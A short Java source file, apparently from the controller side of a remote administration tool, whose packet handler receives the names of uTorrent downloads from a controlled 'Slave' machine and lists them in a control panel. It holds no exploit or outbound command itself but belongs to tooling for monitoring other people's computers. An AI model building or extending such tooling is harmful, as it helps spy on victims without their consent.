package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControluTorrentDownloads;

public class PacketUTOR extends AbstractPacket {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String name = slave.readLine();
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		if (frame != null) {
			PanelControluTorrentDownloads panel = (PanelControluTorrentDownloads) frame.panels.get("utorrent downloads");
			panel.getModel().addRow(new Object[] { panel.getIcon(), name });
		}
	}

}
